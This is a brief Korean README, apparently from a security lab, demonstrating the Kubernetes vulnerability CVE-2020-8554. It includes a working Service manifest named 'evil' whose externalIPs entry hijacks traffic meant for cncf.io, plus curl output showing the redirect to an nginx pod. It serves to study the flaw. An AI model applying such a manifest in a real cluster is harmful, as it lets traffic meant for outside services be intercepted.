# 개요
* CVE-2020-8554 취약점

# 취약점 소개

* external IP를 할당하거나 status.loadBalancer.ingress.ip를 변경하면, externalIP를 호출되는 경우 공격자 pod로 라우팅
* 아래 예제는 cncf IP를 호출하면 nginx pod가 호출됨
* [예제코드 바로가기](./externalIP/)

```yaml
apiVersion: v1
kind: Service
metadata:
  name: evil
  namespace: default
spec:
  selector:
    app: nginx
  ports:
  - protocol: TCP
    port: 80
    targetPort: 80
  type: ClusterIP
  externalIPs:
  - 23.185.0.3 # http://cncf.io
```

```sh
netshoot pod# curl -I http://cncf.io
HTTP/1.1 200 OK
Server: nginx/1.14.2
```

# 참고자료
* https://github.com/kubernetes/kubernetes/issues/97076
* https://unit42.paloaltonetworks.com/cve-2020-8554/
* https://github.com/kubernetes-sigs/cloud-provider-kind
